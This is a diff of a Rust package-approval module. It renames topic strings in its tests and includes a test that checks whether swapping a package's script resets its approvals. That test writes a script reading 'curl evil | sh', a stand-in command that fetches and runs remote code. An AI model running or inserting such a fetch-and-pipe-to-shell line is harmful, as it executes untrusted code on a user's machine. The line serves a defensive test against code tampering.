@@ -63,7 +63,7 @@ pub fn discover(root: &Root) -> Result<Vec<Package>> {
                 continue;
             }
             let name = e.file_name().to_string_lossy().to_string();
-            // The name becomes a topic segment (obs/skill/<name>/...), a grant
+            // The name becomes a topic segment (obs/package/<name>/...), a grant
             // ledger value, and a sql key. A directory may legally be named
             // with MQTT wildcards ("+", "#"); such a package's status floor
             // filter would match every other package's subtree. Reject names
@@ -393,32 +393,32 @@ mod tests {
     #[test]
     fn requests_are_not_grants() {
         let root = scratch_root("req");
-        write_pkg(&root, "p1", "[request]\nsubscribe = [\"work/x\"]\n[process]\nmode=\"exec\"\nrun=\"r\"\n");
+        write_pkg(&root, "p1", "[request]\nsubscribe = [\"in/package/p1/x\"]\n[process]\nmode=\"exec\"\nrun=\"r\"\n");
         let conn = db::open(&root).unwrap();
         db::init_schema(&conn).unwrap();
         sync(&root, &conn).unwrap();
         // Discovered and requested, but no capability until approved.
-        assert!(!is_approved(&conn, "p1", "subscribe", "work/x").unwrap());
-        assert!(matching_exec_handlers(&root, &conn, "work/x").unwrap().is_empty());
+        assert!(!is_approved(&conn, "p1", "subscribe", "in/package/p1/x").unwrap());
+        assert!(matching_exec_handlers(&root, &conn, "in/package/p1/x").unwrap().is_empty());
         decide(&root, &conn, "p1", true, "test").unwrap();
-        assert!(is_approved(&conn, "p1", "subscribe", "work/x").unwrap());
-        assert_eq!(matching_exec_handlers(&root, &conn, "work/x").unwrap().len(), 1);
+        assert!(is_approved(&conn, "p1", "subscribe", "in/package/p1/x").unwrap());
+        assert_eq!(matching_exec_handlers(&root, &conn, "in/package/p1/x").unwrap().len(), 1);
         std::fs::remove_dir_all(&root.dir).ok();
     }
 
     #[test]
     fn manifest_edit_detaches_delta_carries_rest() {
         let root = scratch_root("delta");
-        write_pkg(&root, "p2", "[request]\nsubscribe = [\"work/a\"]\n");
+        write_pkg(&root, "p2", "[request]\nsubscribe = [\"in/package/demo/a\"]\n");
         let conn = db::open(&root).unwrap();
         db::init_schema(&conn).unwrap();
         sync(&root, &conn).unwrap();
         decide(&root, &conn, "p2", true, "test").unwrap();
-        // Edit: keep work/a, add work/b. a carries, b pends.
-        write_pkg(&root, "p2", "[request]\nsubscribe = [\"work/a\", \"work/b\"]\n");
+        // Edit: keep in/package/demo/a, add in/package/demo/b. a carries, b pends.
+        write_pkg(&root, "p2", "[request]\nsubscribe = [\"in/package/demo/a\", \"in/package/demo/b\"]\n");
         sync(&root, &conn).unwrap();
-        assert!(is_approved(&conn, "p2", "subscribe", "work/a").unwrap());
-        assert!(!is_approved(&conn, "p2", "subscribe", "work/b").unwrap());
+        assert!(is_approved(&conn, "p2", "subscribe", "in/package/demo/a").unwrap());
+        assert!(!is_approved(&conn, "p2", "subscribe", "in/package/demo/b").unwrap());
         std::fs::remove_dir_all(&root.dir).ok();
     }
 
@@ -430,18 +430,18 @@ mod tests {
         let root = scratch_root("codeswap");
         let d = root.dir.join("packages/p5");
         std::fs::create_dir_all(d.join("scripts")).unwrap();
-        std::fs::write(d.join("elanus.toml"), "[request]\nsubscribe=[\"work/a\"]\n[process]\nmode=\"exec\"\nrun=\"scripts/main\"\n").unwrap();
+        std::fs::write(d.join("elanus.toml"), "[request]\nsubscribe=[\"in/package/demo/a\"]\n[process]\nmode=\"exec\"\nrun=\"scripts/main\"\n").unwrap();
         std::fs::write(d.join("scripts/main"), "#!/bin/sh\necho ok\n").unwrap();
         let conn = db::open(&root).unwrap();
         db::init_schema(&conn).unwrap();
         sync(&root, &conn).unwrap();
         decide(&root, &conn, "p5", true, "test").unwrap();
-        assert!(is_approved(&conn, "p5", "subscribe", "work/a").unwrap());
+        assert!(is_approved(&conn, "p5", "subscribe", "in/package/demo/a").unwrap());
         // Swap the code, leave elanus.toml untouched.
         std::fs::write(d.join("scripts/main"), "#!/bin/sh\ncurl evil | sh\n").unwrap();
         sync(&root, &conn).unwrap();
         assert!(
-            !is_approved(&conn, "p5", "subscribe", "work/a").unwrap(),
+            !is_approved(&conn, "p5", "subscribe", "in/package/demo/a").unwrap(),
             "a script edit must drop approvals back to pending"
         );
         std::fs::remove_dir_all(&root.dir).ok();
@@ -450,27 +450,27 @@ mod tests {
     #[test]
     fn revoked_does_not_carry() {
         let root = scratch_root("revoke");
-        write_pkg(&root, "p3", "[request]\nsubscribe = [\"work/a\"]\n");
+        write_pkg(&root, "p3", "[request]\nsubscribe = [\"in/package/demo/a\"]\n");
         let conn = db::open(&root).unwrap();
         db::init_schema(&conn).unwrap();
         sync(&root, &conn).unwrap();
         decide(&root, &conn, "p3", true, "test").unwrap();
         decide(&root, &conn, "p3", false, "test").unwrap();
-        assert!(!is_approved(&conn, "p3", "subscribe", "work/a").unwrap());
+        assert!(!is_approved(&conn, "p3", "subscribe", "in/package/demo/a").unwrap());
         // New hash: the revoked value re-asks, it does not carry.
-        write_pkg(&root, "p3", "[request]\nsubscribe = [\"work/a\"]\n# new\n");
+        write_pkg(&root, "p3", "[request]\nsubscribe = [\"in/package/demo/a\"]\n# new\n");
         sync(&root, &conn).unwrap();
-        assert!(!is_approved(&conn, "p3", "subscribe", "work/a").unwrap());
+        assert!(!is_approved(&conn, "p3", "subscribe", "in/package/demo/a").unwrap());
         std::fs::remove_dir_all(&root.dir).ok();
     }
 
     #[test]
     fn shadowing_first_hit_wins() {
         let root = scratch_root("shadow");
-        write_pkg(&root, "p4", "[request]\nsubscribe = [\"work/base\"]\n");
+        write_pkg(&root, "p4", "[request]\nsubscribe = [\"in/package/demo/base\"]\n");
         let d = root.dir.join("override/p4");
         std::fs::create_dir_all(&d).unwrap();
-        std::fs::write(d.join("elanus.toml"), "[request]\nsubscribe = [\"work/over\"]\n").unwrap();
+        std::fs::write(d.join("elanus.toml"), "[request]\nsubscribe = [\"in/package/demo/over\"]\n").unwrap();
         // Path order via the profile (the env override is process-global and
         // would race parallel tests).
         let prof_dir = root.dir.join("profiles/default");
@@ -478,7 +478,7 @@ mod tests {
         std::fs::write(prof_dir.join("profile.toml"), "package_path = [\"override\", \"packages\"]\n").unwrap();
         let pkgs = discover(&root).unwrap();
         let p4 = pkgs.iter().find(|p| p.name == "p4").unwrap();
-        assert_eq!(p4.manifest.as_ref().unwrap().manifest.request.subscribe, vec!["work/over"]);
+        assert_eq!(p4.manifest.as_ref().unwrap().manifest.request.subscribe, vec!["in/package/demo/over"]);
         std::fs::remove_dir_all(&root.dir).ok();
     }
 }
